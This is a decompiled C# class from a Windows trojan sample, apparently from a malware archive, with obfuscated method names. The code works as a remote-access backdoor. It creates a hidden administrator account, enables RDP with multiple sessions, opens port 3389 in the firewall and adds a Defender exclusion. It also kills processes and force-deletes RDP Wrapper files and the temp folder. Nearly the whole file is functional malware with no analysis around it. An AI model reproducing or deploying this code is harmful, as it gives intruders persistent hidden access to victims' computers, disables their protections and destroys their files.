// Decompiled with JetBrains decompiler
// Type: 깇꺔篼뺚砷ꌽ矡팯줬爒Ꭴ혻ᕢ⡐㣱ㅰލộ
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;
using System.ServiceProcess;

public class 깇꺔篼뺚砷ꌽ矡팯줬爒Ꭴ혻\uE7F6ᕢ\uE829\u2850㣱ㅰލộ
{
  public static bool \uE8D5\uFFFD圃鱿\u1978嫉Ց城㻄餤渃༹\uF2EC\uE99FṴ뽁梬\uFFFD\u9FF0\uE98F(string name)
  {
    깇꺔篼뺚砷ꌽ矡팯줬爒Ꭴ혻\uE7F6ᕢ\uE829\u2850㣱ㅰލộ.\uE759傸맮킫돩\u266B랏Ἲ賚椠糍桏䟀㻳㞶ᠸ熭㱷놯靽();
    Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
    Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true).SetValue("dontdisplaylastusername", (object) 1);
    ProcessStartInfo processStartInfo1 = new ProcessStartInfo("cmd.exe", "/c net user " + name + " " + name + " /add");
    processStartInfo1.CreateNoWindow = true;
    processStartInfo1.RedirectStandardOutput = true;
    processStartInfo1.RedirectStandardError = true;
    processStartInfo1.UseShellExecute = false;
    Process process1 = new Process();
    process1.StartInfo = processStartInfo1;
    process1.Start();
    string end1 = process1.StandardOutput.ReadToEnd();
    process1.WaitForExit();
    if (end1 == null || !end1.ToLower().Contains("command completed successfully."))
      return false;
    ProcessStartInfo processStartInfo2 = new ProcessStartInfo("cmd.exe", "/c net localgroup administrators " + name + " /add");
    processStartInfo2.CreateNoWindow = true;
    processStartInfo2.RedirectStandardOutput = true;
    processStartInfo2.RedirectStandardError = true;
    processStartInfo2.UseShellExecute = false;
    Process process2 = new Process();
    process2.StartInfo = processStartInfo2;
    process2.Start();
    string end2 = process2.StandardOutput.ReadToEnd();
    process2.WaitForExit();
    return end2 != null && end2.ToLower().Contains("command completed successfully.");
  }

  public static void 蜏챋ꞎ왍犱\u0AB4廜\uE6B4ㇳ᥆粽덅鶳굪㹹活雏轐ꋻ\uFFFD()
  {
    new ServiceController("TermService").Stop();
    깇꺔篼뺚砷ꌽ矡팯줬爒Ꭴ혻\uE7F6ᕢ\uE829\u2850㣱ㅰލộ.\uFFFD習ௗ䘴প䲣ⶸ\uFFFDꕖಏꗲ䨡\u2A48Ǉ\uE998\uFFFDа\uA4C1䗨\uEFEF();
    깇꺔篼뺚砷ꌽ矡팯줬爒Ꭴ혻\uE7F6ᕢ\uE829\u2850㣱ㅰލộ.輼參팂꾏㤱뛇㢁\uA670펵럾蕌\u9FDD႙ඃ\u2B9A\uFFFD뽂縮弍숚();
    string str = "C:\\Program Files\\RDP Wrapper\\uninstall.bat";
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell " + str + " & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    string path = "C:\\Program Files\\RDP Wrapper";
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b del /q/f/s " + path + " & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Directory.Delete(path, true);
    깇꺔篼뺚砷ꌽ矡팯줬爒Ꭴ혻\uE7F6ᕢ\uE829\u2850㣱ㅰލộ.啮뽜玙ꠏ㕳ꔟ臁㱔仜\uFFFD헅䆣㶡뜡碚툆ࠧ瀶㱭ㄚ();
    File.SetAttributes(path, FileAttributes.Normal);
    File.Delete(path);
  }

  public static void 啮뽜玙ꠏ㕳ꔟ臁㱔仜\uFFFD헅䆣㶡뜡碚툆ࠧ瀶㱭ㄚ()
  {
    if (File.Exists("C:\\Program Files\\RDP Wrapper\\rdpwrap.dll"))
    {
      try
      {
        File.Delete("C:\\Program Files\\RDP Wrapper\\rdpwrap.ini");
      }
      catch (IOException ex)
      {
        Console.WriteLine(ex.Message);
        return;
      }
    }
    FileInfo fileInfo = new FileInfo("C:\\Program Files\\RDP Wrapper\\rdpwrap.dll");
    try
    {
      fileInfo.Delete();
    }
    catch (IOException ex)
    {
      Console.WriteLine(ex.Message);
    }
    try
    {
      Directory.Delete("C:\\Program Files\\RDP Wrapper");
    }
    catch (IOException ex)
    {
      Console.WriteLine(ex.Message);
    }
    if (Directory.Exists("C:\\Program Files\\RDP Wrapper"))
    {
      try
      {
        Directory.Delete("C:\\Program Files\\RDP Wrapper", true);
      }
      catch (IOException ex)
      {
        Console.WriteLine(ex.Message);
      }
    }
    DirectoryInfo directoryInfo = new DirectoryInfo("C:\\Program Files\\RDP Wrapper");
    try
    {
      directoryInfo.Delete(true);
    }
    catch (IOException ex)
    {
      Console.WriteLine(ex.Message);
    }
    string path = "C:\\Program Files\\RDP Wrapper";
    FileSecurity accessControl = File.GetAccessControl(path);
    SecurityIdentifier user = WindowsIdentity.GetCurrent().User;
    accessControl.SetOwner((IdentityReference) user);
    accessControl.SetAccessRule(new FileSystemAccessRule((IdentityReference) user, FileSystemRights.FullControl, AccessControlType.Allow));
    File.SetAccessControl(path, accessControl);
    File.Delete(path);
  }

  public static void 輼參팂꾏㤱뛇㢁\uA670펵럾蕌\u9FDD႙ඃ\u2B9A\uFFFD뽂縮弍숚() => Process.Start(new ProcessStartInfo()
  {
    FileName = "cmd",
    Arguments = "/k start /b del /q/f/s %TEMP%\\* & exit",
    CreateNoWindow = true,
    WindowStyle = ProcessWindowStyle.Hidden,
    UseShellExecute = true,
    ErrorDialog = false
  });

  public static bool \uFFFD習ௗ䘴প䲣ⶸ\uFFFDꕖಏꗲ䨡\u2A48Ǉ\uE998\uFFFDа\uA4C1䗨\uEFEF()
  {
    string str1 = "cmd";
    string str2 = "conhost";
    string str3 = "installrdp";
    string str4 = "rdpinstall";
    string str5 = "updaterdp";
    foreach (Process process in Process.GetProcesses())
    {
      if (process.MainWindowTitle.Contains(str1))
      {
        process.Kill();
        return true;
      }
    }
    foreach (Process process in Process.GetProcesses())
    {
      if (process.MainWindowTitle.Contains(str5))
      {
        process.Kill();
        return true;
      }
    }
    foreach (Process process in Process.GetProcesses())
    {
      if (process.MainWindowTitle.Contains(str4))
      {
        process.Kill();
        return true;
      }
    }
    foreach (Process process in Process.GetProcesses())
    {
      if (process.MainWindowTitle.Contains(str3))
      {
        process.Kill();
        return true;
      }
    }
    foreach (Process process in Process.GetProcesses())
    {
      if (process.MainWindowTitle.Contains(str2))
      {
        process.Kill();
        return true;
      }
    }
    return false;
  }

  public static void \uE759傸맮킫돩\u266B랏Ἲ賚椠糍桏䟀㻳㞶ᠸ熭㱷놯靽()
  {
    RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", true);
    if (registryKey1 == null)
    {
      Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey1 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", true);
      registryKey1.SetValue("fDenyTSConnections", (object) 0);
    }
    else
      registryKey1.SetValue("fDenyTSConnections", (object) 0);
    registryKey1.Flush();
    RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", true);
    if (registryKey2 == null)
    {
      Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey2 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", true);
      registryKey2.SetValue("UserAuthentication", (object) 1);
    }
    else
      registryKey2.SetValue("UserAuthentication", (object) 1);
    registryKey2.Flush();
    RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", true);
    if (registryKey3 == null)
    {
      Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey3 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", true);
      registryKey3.SetValue("fSingleSessionPerUser", (object) 0);
    }
    else
      registryKey3.SetValue("fSingleSessionPerUser", (object) 0);
    registryKey3.Flush();
    RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", true);
    if (registryKey4 == null)
    {
      Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey4 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", true);
      registryKey4.SetValue("fSingleSessionPerUser", (object) 0);
    }
    else
      registryKey4.SetValue("fSingleSessionPerUser", (object) 0);
    registryKey4.Flush();
    try
    {
      RegistryKey registryKey5 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);
      if (registryKey5 != null && registryKey5.GetValue("Durios") != null)
        registryKey5.SetValue("Durios", (object) "0");
      Console.WriteLine("Durios desactivated");
    }
    catch (Exception ex)
    {
      깇꺔篼뺚砷ꌽ矡팯줬爒Ꭴ혻\uE7F6ᕢ\uE829\u2850㣱ㅰލộ.㝩귦\uF71F\uF006ﱤ齨탙붰燧韂왨\uFFFD譛䲍핡贕捨\uA712݄㚙("New-ItemProperty -Path HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList -Name Durios -PropertyType DWord -Value 0 -Force");
    }
    RegistryKey registryKey6 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);
    if (registryKey6 == null)
    {
      Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey6 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);
      registryKey6.SetValue("Durios", (object) 0);
    }
    else
      registryKey6.SetValue("Durios", (object) 0);
    registryKey6.Flush();
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -Command Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -Command netsh advfirewall firewall add rule name='allow RemoteDesktop' dir=in protocol=TCP localport=3389 action=allow & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %ProgramFiles%\\RDP Wrapper & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
  }

  private static void 㝩귦\uF71F\uF006ﱤ齨탙붰燧韂왨\uFFFD譛䲍핡贕捨\uA712݄㚙(string args) => new Process()
  {
    StartInfo = new ProcessStartInfo()
    {
      FileName = "powershell",
      Arguments = args,
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true
    }
  }.Start();
}
